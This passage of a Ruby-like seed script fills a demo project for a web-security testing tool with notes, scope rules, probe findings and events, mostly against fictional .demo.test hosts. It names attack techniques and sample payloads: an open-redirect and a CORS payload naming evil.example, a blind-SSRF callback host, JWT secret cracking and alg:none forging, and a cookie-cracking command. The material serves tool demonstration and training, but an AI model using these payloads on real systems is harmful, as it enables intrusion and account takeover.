- **GraphQL** POST /graphql — plain JSON (query / mutation / introspection). Introspection is ON (see Issues).
- **SAML** POST /saml/acs — SAMLResponse is url-encoded base64 XML.
  Decode in the Decoder tab: url-decode → base64-decode (→ XML assertion for alice@demo.test).
- **Not a protocol, but the same idea** — a `connect-udp` (MASQUE) tunnel: an extended CONNECT that
  is NOT a WebSocket, so it stays HTTPS and has no transcript; a `STUB` row gori answered itself;
  a gzip'd chunked body; a plaintext forward-proxy request captured absolute-form; HTTP/1.0; a
  HEAD and a 304 with no body; and two flows that never got a response at all (ERR).

## Live target (real, replayable)
- **www.hahwul.com** is a real, live site (unlike the shop/api hosts above) — every
  captured flow is a genuine response, so Repeater (^R) actually re-sends it over the
  network and gets a live response back. Good for trying Repeater/Diff/Probe against
  real traffic instead of only synthetic data.
- Recon flow: /robots.txt -> /sitemap.xml -> / -> a css asset -> /posts/ -> an
  article -> a note -> /about/, plus one guessed path that 404s.

## Entity links
- **Issue detail** → Space → `l` opens the links overlay; `↵` opens the selected ref
  (`↑/↓`·`j/k` navigate the RELATED list). The RELATED pane lists cross-links
  (repeater/fuzz/miner/history) beyond the primary evidence flow.
- **Notes sub-tab** → Space → `l` opens links for the active note (preview strip at the bottom).
- **History / Repeater / Fuzzer / Miner** → Space → `k` link to an issue, `u` link to a note.
- This demo project already has links seeded — try the XSS or SSRF issue, or switch to the
  "Workbench cross-links" note sub-tab.
NOTES

note_links = <<-NOTES2
# Workbench cross-links

Pointers to the repeater/fuzz/miner/sequencer sessions tied to this engagement.
Space → `l` (links) on this sub-tab opens the overlay; `↵`/`o` jumps to the linked session or flow.

- **XSS PoC** repeater — re-send the reflected /search payload
- **IDOR probe** repeater — GET /v1/users/2 with the customer token (opens WITH its last response)
- **SSRF → OAST** repeater — POST /v1/import with an OAST payload host
- **bound $token** repeater — written in `$API` / `$token` / `$UA`, resolved at send time
- **WS chat** repeater — a WebSocket session (upgrade handshake + 4 outbound frames)
- **OAuth refresh** repeater — re-run the token exchange with a different client
- **user id enum** fuzz — sweep /v1/users/{id} (positions marked §1§)
- **login cluster bomb** fuzz — 3 usernames × 4 passwords, 401s filtered out
- **path traversal** fuzz — `§app.js¦url-encode§`, a position with a decoder chain on it
- **users path mine** — hidden-parameter probe on /v1/users/
- **header/cookie mine** — the same idea over headers + cookies
- **sid randomness** sequencer — grade the /api/login session-cookie entropy
- **oauth code entropy** sequencer — the same over a byte range of the Location header
- **WebSocket chat** flow — MESSAGES pane for the 101 upgrade
- **graphql-ws subscription** flow — a GRAPHQL pane built from the frames, not from a body
- **hahwul home** repeater — live, replayable traffic against www.hahwul.com
NOTES2

note_tools = <<-NOTES3
# Tooling cheatsheet

Which tab does what on this demo (send a selection to a tool with Space → the tool's key).

- **Rewriter** — 7 match&replace rules. Two are ON (add `X-Frame-Options`, strip the
  `Server` banner); five are staged OFF (redact `Bearer …` via regex, a body-rewrite proof,
  a forced CSP, a request-body privilege flip, and a SHORT-CIRCUIT that answers the JS
  bundle locally). Toggle one on, then re-send from Repeater to watch it take effect.
- **Rewriter → bindings** — 5 extract rules (the READ half). `token` (jsonpath) and `sid`
  (cookie) are lifted from /api/login and published as `$token` / `$sid`.
- **Env (^E)** — 5 project vars: `$API`, `$SHOP`, `$AUTH`, `$UA`, `$ADMIN_ID`. The
  "bound $token" Repeater tab is written entirely in them; they expand only at send time.
- **Colormarker** — 7 row-colour rules (first match wins): 5xx red, 401/403 orange,
  legacy.demo.test purple, websocket blue, the token exchange green, gRPC/SSE green strip.
- **OAST** — the out-of-band listener. It holds the DNS + HTTP callbacks the server made
  when it fetched our payload host (proof of the blind SSRF). Polling is paused on load.
- **Sequencer** — "sid randomness" re-collects the login cookie and grades its entropy;
  "oauth code entropy" does the same over a byte range of a Location header.
- **JWT** — two real HS256 tokens to try: the session token and the OIDC `id_token` from
  /oauth/token. Decode the claims, run the weak-secret attack (it recovers the key),
  then re-forge `{"role":"admin"}` or try alg:none.
- **Decoder** — opens with 5 sub-tabs already loaded: the SAML assertion (url → base64),
  the session JWT, the Flask cookie (`cookie-decode` auto-detects the framework), the
  Basic-auth credentials, and a hash of the DSN leaked by the bundle.
- **Cookie workbench** — three signed cookies on legacy.demo.test: Flask (/admin/dashboard),
  Django (/py/portal), Rack (/rb/orders). Crack them with
  `gori run cookie --crack --secrets #{COOKIE_SECRET},dev,changeme <cookie>`; the Flask and
  Django keys are the same, Rack's is longer.
- **Comparer** — diff two flows side by side (e.g. /v1/users/1 vs /v1/users/2 for the IDOR,
  or the two /v1/products pages).
- **Probe** — passive findings over every seeded flow, plus 4 project custom rules and 4
  seeded ACTIVE findings (reflected param, open redirect, CORS, blind SSRF) with their
  out-of-band probe records. Mode is Passive; live active probing needs live traffic.
- **Target** — Sitemap (10 tagged paths across 6 hosts) + Discover.
- **Settings → network** — 5 hostname overrides point the fictional .test hosts at loopback.
NOTES3

note_start = <<-NOTES4
# Start here — a 10-minute tour

1. **History** — rows are coloured by the Colormarker rules (5xx red, 401/403 orange,
   legacy purple). Sort by duration to find the 8.4s export; `/v1/reports/rebuild` reads
   ERR — a request whose response never arrived, adopted as orphaned on the next open.
   Look at the PROTO column: HTTP/HTTPS, WS/WSS, GRPC/GRPCS, SSE/SSES and one STUB row are
   all present. `proto:grpc` finds the cleartext AND the TLS gRPC calls; `proto:grpcs` only
   the TLS ones. See the "Protocols on this target" section of the recon note for the tour.
   Then look at the SRC column beside it: five rows say something other than `PROXY`, and
   they are the ones the target's own client never sent. `src:gori` selects them (a yellow
   strip marks them too); `src:proxy` reads History as traffic that really happened. See
   "Where these flows came from" in the recon note.
2. **A binary body** — open `GET /avatars/1.png` (cdn.demo.test): no text rendering, so
   the pane falls back to hex. `GET /ko/notice` is EUC-KR — bytes that are not UTF-8.
3. **The Decoder** already has five sub-tabs loaded. Run the SAML one, then the Flask
   cookie one (`cookie-decode` auto-detects Flask vs Rack vs Django).
4. **JWT** — send the login token (Space → JWT), crack the secret, re-forge the payload.
5. **Repeater** — "bound $token" is written in `$API`/`$token`. Open the env overlay (^E)
   to see where those come from, then look at the "WS chat" tab: a WebSocket session with
   four outbound frames queued.
6. **Issues** — 18 of them, deliberately across all four triage states. The two on
   legacy.demo.test are cookie findings; the .env one is Critical. Two more come from the
   protocol traffic: a session JWT on a cleartext WebSocket, and an unauthenticated gRPC
   admin service on h2c.
7. **Probe** — passive findings from the traffic plus four active ones. The list defaults
   to OPEN findings; press `a` to include the triaged ones — two are confirmed (the blind
   SSRF and the CORS reflection) and one header rule is muted project-wide. Follow the
   SSRF to the OAST tab, which holds the DNS + HTTP callbacks that proved it.
8. **www.hahwul.com** — the only REAL host here. Its Repeater tab ("hahwul home") genuinely
   re-sends over the network, so Repeater → Comparer against a live response works.
NOTES4

store.set_setting(Notes::DOCS_KEY, Notes.serialize(0, [
  Notes::NoteEntry.new(NOTE_MAIN, note_main),
  Notes::NoteEntry.new(NOTE_LINKS, note_links),
  Notes::NoteEntry.new(NOTE_TOOLS, note_tools),
  Notes::NoteEntry.new(NOTE_START, note_start),
], 5_i64))

# --- Scope (seed patterns, left OFF so History shows everything) ------------
# Both halves of the model are represented: the include list is the engagement, and the
# exclude rule is the CDN noise you never want an active tool to touch even though its
# host is in scope.
store.add_scope_rule("include", "host", "shop.demo.test")
store.add_scope_rule("include", "host", "api.demo.test")
store.add_scope_rule("include", "host", "auth.demo.test")
store.add_scope_rule("include", "host", "legacy.demo.test")
store.add_scope_rule("include", "host", "www.hahwul.com")
store.add_scope_rule("exclude", "host", "cdn.demo.test")
store.add_scope_rule("exclude", "string", "/logout")

# --- Probe passive scan: run the analyzer (built-ins + this project's custom rules) over
# every seeded flow so the Probe tab opens populated (and the Project tab shows the
# detected technologies). This mirrors what the live Probe::Analyzer does on captured
# traffic — no extra requests. MODE is left at the safe default (Passive); active
# reflected-param probing needs live traffic.
custom_rules = Probe.custom_rules(store)
store.recent_flows(1000).each do |row|
  if detail = store.get_flow(row.id)
    Probe::Passive.analyze(detail, custom: custom_rules).each { |d| store.upsert_probe_issue(d) }
  end
end
store.set_probe_mode(Probe::Mode::Passive)

# --- Probe: ACTIVE findings + the out-of-band bridge ------------------------
# A passive pass over captured bytes cannot produce these — they are what an active sweep
# (`gori run probe --mode active`) leaves behind, and they are seeded so the Probe tab has
# something in the ACTIVE category and the codes below have their real remediation text.
[
  Probe::Detection.new("reflected_param", "active", "shop.demo.test",
    "https://shop.demo.test/search?q=", "Reflected parameter (q) echoed unencoded",
    S::Severity::High,
    evidence: "probe marker gOrI9f3a reflected verbatim in text/html at offset 118 (context: <b>…</b>)",
    flow_id: ids[:xss]),
  Probe::Detection.new("open_redirect", "active", "shop.demo.test",
    "https://shop.demo.test/go?next=", "Open redirect via the `next` parameter",
    S::Severity::Medium,
    evidence: "next=https://evil.example/harvest → 302 Location: https://evil.example/harvest",
    flow_id: ids[:redirect]),
  Probe::Detection.new("cors_arbitrary_origin", "cors", "api.demo.test",
    "https://api.demo.test/v1/cart", "CORS reflects an arbitrary Origin with credentials",
    S::Severity::High,
    evidence: "Origin: https://evil.example → Access-Control-Allow-Origin: https://evil.example; Allow-Credentials: true",
    flow_id: ids[:cors]),
  Probe::Detection.new("ssrf_oast", "active", "api.demo.test",
    "https://api.demo.test/v1/import", "Blind SSRF (server fetched an attacker-controlled URL)",
    S::Severity::High,
    evidence: "payload host a1b2c3d4.oast.demo.test drew a DNS lookup then an HTTP GET from 203.0.113.10",
    flow_id: ids[:ssrf]),
].each { |d| store.upsert_probe_issue(d) }

# The durable half of an out-of-band check: what was planted, where, and whether it ever
# called home. The first row was promoted by the callbacks in the OAST tab; the second is
# still outstanding, which is what most of them look like.
store.insert_probe_oast_probe("a1b2c3d4", "https://a1b2c3d4.oast.demo.test/hook?from=api.demo.test",
  oast_session, "ssrf_oast", "ssrf_oast", "active",
  "Blind SSRF (server fetched an attacker-controlled URL)", S::Severity::High,
  "api.demo.test", "https://api.demo.test/v1/import",
  "planted in the JSON body parameter `url`", ids[:ssrf])
store.insert_probe_oast_probe("e5f6a7b8", "https://e5f6a7b8.oast.demo.test/hook",
  oast_session, "ssrf_oast", "ssrf_oast", "active",
  "Blind SSRF (server fetched an attacker-controlled URL)", S::Severity::High,
  "shop.demo.test", "https://shop.demo.test/go?next=",
  "planted in the query parameter `next` — no callback yet", ids[:redirect])
store.probe_oast_pending.find { |p| p.token == "a1b2c3d4" }.try { |p| store.mark_probe_oast_matched(p.id) }

# Triage state, so the Probe tab is not a flat wall of "open": two confirmed by hand, and
# one low-value header rule muted across the whole project the way an operator would mute
# it (a bulk dismiss marks false-positive rather than deleting, so a re-hit stays muted).
store.probe_issues.each do |pi|
  case pi.code
  when "ssrf_oast", "cors_arbitrary_origin"
    store.update_probe_issue_status(pi.id, S::Status::Confirmed)
  end
end
store.dismiss_probe_by_code("missing_permissions_policy")

codes = store.probe_issues.map(&.code).tally.to_a.sort_by { |(_, n)| -n }
puts "• probe: #{store.count_probe_issues} issues over #{codes.size} codes; tech=#{store.probe_tech_summary.join(", ")}"

# --- Event feed (#124) — the job/action log MCP `list_events` tails ---------
# The trail this engagement would have left. Seeded so the feed is not empty on a fresh
# project and `goto_tab`/`goto_session_id` have something to jump to.
store.insert_event("discover", "job_done", "info", "discover finished: 6 hosts, 41 endpoints, 3 new",
  goto_tab: "target")
store.insert_event("probe", "issue", "warn", "probe: blind SSRF confirmed out-of-band on api.demo.test",
  goto_tab: "probe", flow_id: ids[:ssrf])
store.insert_event("mcp", "action", "info", "agent created issue \"Deployed .env readable\"",
  goto_tab: "issues", flow_id: ids[:dotenv])
store.insert_event("fuzz", "job_done", "info", "fuzz \"user id enum\" finished: 10 sent, 2 matched",
  goto_tab: "fuzzer", goto_session_id: ids[:fuzz_users])
store.insert_event("oast", "callback", "warn", "OAST: HTTP callback from 203.0.113.10 for a1b2c3d4",
  goto_tab: "oast")
store.insert_event("repeater", "send", "info", "repeater \"IDOR probe\" → 200 in 34ms",
  goto_tab: "repeater", goto_session_id: ids[:repeater_idor])
store.flush

store.close
puts "• notes (4 tabs) + 7 scope patterns + 6 events written"
puts "\n✓ demo project ready — launch ./bin/gori and pick 'demo'."
puts "  Start with Notes → \"Start here — a 10-minute tour\"."
